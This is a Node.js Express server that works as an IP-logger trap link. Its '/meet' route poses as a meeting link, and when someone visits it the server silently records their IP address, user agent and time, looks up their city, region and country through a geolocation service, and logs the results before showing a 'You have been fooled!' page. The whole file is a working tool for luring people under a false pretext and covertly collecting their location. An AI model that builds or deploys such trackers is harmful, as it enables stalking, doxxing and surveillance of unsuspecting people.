const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

const FUNKY_IMAGE_URL = 'https://images.unsplash.com/photo-1741866987680-5e3d7f052b87?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D';

// Helper to get real IP
function getRealIP(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  return forwardedFor ? forwardedFor.split(',')[0] : req.connection.remoteAddress;
}

app.get('/meet', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();

  let locationData = {
    city: 'Unknown',
    regionName: 'Unknown',
    country: 'Unknown'
  };

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    if (geoRes.data.status === 'success') {
      locationData = geoRes.data;
    } else {
      console.error('⚠️ Error fetching location:', geoRes.data.message);
    }

    console.log(`📍 New Visit`);
    console.log(`IP: ${ip}`);
    console.log(`Location: ${locationData.city}, ${locationData.regionName}, ${locationData.country}`);
    console.log(`User Agent: ${userAgent}`);
    console.log(`Time: ${timestamp}`);
  } catch (err) {
    console.error('⚠️ Error fetching location:', err.message);
  }

  res.send(`
    <html>
      <head>
        <title>🎉 You Have Been Fooled! 🎉</title>
      </head>
      <body style="text-align:center; font-family:Arial, sans-serif;">
        <h1>🎉 Welcome! 🎉</h1>
        <h2>You have been fooled!</h2>
        <img src="${FUNKY_IMAGE_URL}" alt="Funky Image" style="width:50%; max-width:400px; border-radius:10px; margin:20px 0;">
      
      </body>
    </html>
  `);
});

// Use '0.0.0.0' to make the app accessible externally
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running at http://0.0.0.0:${PORT}`);
});
